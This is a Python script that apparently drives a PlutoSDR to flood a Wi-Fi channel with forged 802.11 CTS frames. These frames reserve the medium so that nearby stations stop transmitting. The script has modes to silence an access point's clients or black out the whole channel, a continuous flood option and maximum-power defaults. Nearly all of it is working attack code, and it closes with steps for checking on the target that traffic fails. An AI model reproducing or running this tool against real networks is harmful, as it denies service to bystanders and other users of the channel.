#!/usr/bin/env python3
"""CTS flood — NAV reservation via Control frame injection.

Transmits CTS frames that cause nearby 802.11 stations to update their
NAV (Network Allocation Vector), suppressing transmissions.

Two attack modes:
  --ra <AP_BSSID>    : Silence clients only. AP ignores CTS with its own
                        address per §10.3.2.4. Laptop stays "connected"
                        (beacons still arrive) but can't send anything.
  --ra <random>      : Silence all stations including the AP. Full channel
                        blackout — beacons stop, everything stops.

CTS frames are tiny (10 bytes PSDU → ~40 µs on-air at 6 Mbps). The
duration field reserves up to 32767 µs (~32 ms) per frame.

PREREQUISITES:
  - PlutoSDR must be on the same channel as the target AP.
  - No PMF check needed — CTS is a PHY-layer mechanism, not management.

HARDWARE SETUP:
  PlutoSDR TX → 5 GHz antenna

Usage:
    # Phase 1: silence clients, AP stays visible
    python tools/hardware/test_tx_cts.py --ra aa:bb:cc:dd:ee:01

    # Phase 2: full channel blackout (random unicast RA)
    python tools/hardware/test_tx_cts.py --ra 02:00:00:00:00:01

    # Dry run — build waveform, show stats, don't transmit
    python tools/hardware/test_tx_cts.py --ra aa:bb:cc:dd:ee:01 --dry-run

    # Continuous mode
    python tools/hardware/test_tx_cts.py --ra aa:bb:cc:dd:ee:01 --continuous
"""

import argparse
import os
import signal
import sys
import time

import numpy as np

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "python"))
sys.path.insert(0, os.path.dirname(__file__))

from py80211.gen_ofdm_frame import generate_frame, SAMPLE_RATE
from py80211.mac_frames import build_cts
from frame_utils import CHANNEL_FREQ

# --- Defaults ---
DEFAULT_CHANNEL = 36
DEFAULT_RATE = 6               # CTS at lowest basic rate for reliability
DEFAULT_CTS_DURATION = 32767   # max 15-bit NAV reservation (~32ms)
DEFAULT_TX_ATTEN = 0           # max power
DEFAULT_BURST_COUNT = 3        # frames per burst
DEFAULT_BURST_INTERVAL_MS = 5  # ms between frames within a burst


def parse_mac(mac_str: str) -> bytes:
    parts = mac_str.strip().split(":")
    if len(parts) != 6:
        raise ValueError(f"Invalid MAC address: {mac_str}")
    return bytes(int(p, 16) for p in parts)


def mac_to_str(mac_bytes: bytes) -> str:
    return ":".join(f"{b:02x}" for b in mac_bytes)


def build_cts_waveform(ra: bytes, duration: int, rate_mbps: int) -> np.ndarray:
    psdu = build_cts(ra=ra, duration=duration)
    iq, _meta = generate_frame(rate_mbps, psdu)
    return iq


def build_burst_buffer(ra: bytes, duration: int, rate_mbps: int,
                       burst_count: int, interval_ms: float) -> np.ndarray:
    frame_iq = build_cts_waveform(ra, duration, rate_mbps)
    gap_samples = int(interval_ms * 1e-3 * SAMPLE_RATE)

    parts = []
    for _ in range(burst_count):
        parts.append(frame_iq)
        parts.append(np.zeros(gap_samples, dtype=np.complex64))

    return np.concatenate(parts)


def main():
    parser = argparse.ArgumentParser(
        description="CTS flood — NAV reservation via Control frame injection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --ra aa:bb:cc:dd:ee:01              # silence clients
  %(prog)s --ra 02:00:00:00:00:01              # full blackout
  %(prog)s --ra aa:bb:cc:dd:ee:01 --continuous # hold until Ctrl-C
  %(prog)s --ra aa:bb:cc:dd:ee:01 --dry-run    # inspect waveform
""")
    parser.add_argument("--ra", type=str, required=True,
                        help="Receiver Address for CTS (AP BSSID silences clients; "
                             "random unicast silences everyone)")
    parser.add_argument("--channel", type=int, default=DEFAULT_CHANNEL,
                        help=f"WiFi channel (default: {DEFAULT_CHANNEL})")
    parser.add_argument("--cts-duration", type=int, default=DEFAULT_CTS_DURATION,
                        help=f"CTS duration/NAV in µs, max 32767 (default: {DEFAULT_CTS_DURATION})")
    parser.add_argument("--rate", type=int, default=DEFAULT_RATE,
                        help=f"PHY rate in Mbps (default: {DEFAULT_RATE})")
    parser.add_argument("--tx-atten", type=float, default=DEFAULT_TX_ATTEN,
                        help=f"TX attenuation in dB (default: {DEFAULT_TX_ATTEN})")
    parser.add_argument("--count", type=int, default=DEFAULT_BURST_COUNT,
                        help=f"Frames per burst (default: {DEFAULT_BURST_COUNT})")
    parser.add_argument("--interval", type=float, default=DEFAULT_BURST_INTERVAL_MS,
                        help=f"Inter-frame gap within burst in ms (default: {DEFAULT_BURST_INTERVAL_MS})")
    parser.add_argument("--continuous", action="store_true",
                        help="Keep transmitting bursts until Ctrl-C")
    parser.add_argument("--uri", type=str, default=None,
                        help="PlutoSDR URI")
    parser.add_argument("--dry-run", action="store_true",
                        help="Build waveform and print stats without transmitting")
    args = parser.parse_args()

    ra = parse_mac(args.ra)

    if args.channel not in CHANNEL_FREQ:
        sys.exit(f"Unknown channel {args.channel}. "
                 f"Supported: {sorted(CHANNEL_FREQ.keys())}")
    freq = CHANNEL_FREQ[args.channel]

    if args.cts_duration > 32767:
        sys.exit("CTS duration must be <= 32767 µs (15-bit field max)")

    print("=" * 60)
    print("CTS FLOOD — NAV RESERVATION ATTACK")
    print("=" * 60)
    print(f"  RA:            {mac_to_str(ra)}")
    print(f"  Channel:       {args.channel} ({freq/1e6:.0f} MHz)")
    print(f"  CTS duration:  {args.cts_duration} µs")
    print(f"  Rate:          {args.rate} Mbps")
    print(f"  TX atten:      {args.tx_atten} dB")
    print(f"  Burst:         {args.count} frames, {args.interval} ms apart")
    print()

    frame_iq = build_cts_waveform(ra, args.cts_duration, args.rate)
    frame_us = len(frame_iq) / SAMPLE_RATE * 1e6
    print(f"  Frame:         {len(frame_iq)} samples ({frame_us:.0f} µs)")

    burst_iq = build_burst_buffer(ra, args.cts_duration, args.rate,
                                  args.count, args.interval)
    burst_ms = len(burst_iq) / SAMPLE_RATE * 1000
    print(f"  Burst buffer:  {len(burst_iq):,} samples ({burst_ms:.1f} ms)")
    print()

    if args.dry_run:
        print("DRY RUN — not transmitting.")
        print(f"  Peak amplitude: {np.max(np.abs(frame_iq)):.4f}")
        psdu = build_cts(ra=ra, duration=args.cts_duration)
        print(f"  PSDU ({len(psdu)} bytes): {psdu.hex()}")
        print(f"  FC: 0x{psdu[1]:02x}{psdu[0]:02x} (expected: 0x00C4)")
        print(f"  Duration: {psdu[2] | (psdu[3] << 8)} µs")
        print(f"  RA: {mac_to_str(psdu[4:10])}")
        return

    from pluto import find_pluto, configure_tx, transmit, stop_tx

    uri, sdr = find_pluto(args.uri)
    print(f"PlutoSDR: {uri}")
    configure_tx(sdr, freq, attenuation_db=args.tx_atten)

    if args.continuous:
        print("CONTINUOUS MODE — transmitting CTS bursts until Ctrl-C")
        print("Press Ctrl-C to stop.")
        print()

        stopped = False

        def handle_sigint(sig, frame):
            nonlocal stopped
            stopped = True

        signal.signal(signal.SIGINT, handle_sigint)

        burst_num = 0
        transmit(sdr, burst_iq)
        while not stopped:
            burst_num += 1
            time.sleep(args.interval / 1000.0)
            if burst_num % 20 == 0:
                print(f"  ... {burst_num} bursts sent")

        stop_tx(sdr)
        print(f"\nStopped after ~{burst_num} bursts.")
    else:
        print(f"Sending 1 burst of {args.count} CTS frames...")
        transmit(sdr, burst_iq)
        time.sleep(burst_ms / 1000.0 + 0.005)
        stop_tx(sdr)
        print(f"Done. Sent {args.count} CTS frames.")

    print()
    print("Verify on target client:")
    print("  Browser, ping, or any outbound traffic should fail.")
    print("  If RA was a non-AP address, beacons also stop.")


if __name__ == "__main__":
    main()
